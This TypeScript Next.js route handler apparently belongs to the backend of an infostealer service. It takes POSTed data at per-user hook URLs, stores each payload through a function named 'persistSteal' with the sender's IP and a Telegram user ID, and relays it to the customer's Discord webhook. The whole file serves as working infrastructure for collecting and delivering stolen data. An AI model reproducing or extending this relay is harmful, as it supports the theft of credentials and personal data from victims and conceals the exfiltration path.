import { NextRequest, NextResponse } from "next/server";
import { hookForwardTarget, validDiscordWebhook } from "@/lib/db";
import { discordDest, postDiscord } from "@/lib/discord-proxy";
import { rateOk } from "@/lib/rate";
import { persistSteal } from "@/lib/steal";

export const runtime = "nodejs";

async function forward(req: NextRequest, hookId: string, hookSecret: string) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "unknown";
  if (!rateOk(`${ip}:${hookId}`, 40, 60_000)) {
    return new NextResponse("rate", { status: 429 });
  }
  const { user, why } = await hookForwardTarget(hookId, hookSecret);
  if (!user) {
    return new NextResponse(why, { status: why === "not_found" ? 401 : 403 });
  }
  if (!validDiscordWebhook(user.webhook || "")) {
    return NextResponse.json({ ok: false, error: "bad_webhook" }, { status: 400 });
  }

  const body = Buffer.from(await req.arrayBuffer());
  const ct = req.headers.get("content-type") ?? "application/json";
  const dest = discordDest(user.webhook!, req.nextUrl.search, body, ct);

  try {
    await persistSteal(Number(user.tg_id), ip, body, ct);
  } catch {
  }

  return postDiscord(
    dest,
    body,
    ct,
    req.headers.get("user-agent") ?? "Mozilla/5.0",
  );
}

export async function POST(
  req: NextRequest,
  ctx: { params: Promise<{ hookId: string; hookSecret: string }> },
) {
  const { hookId, hookSecret } = await ctx.params;
  return forward(req, hookId, hookSecret);
}
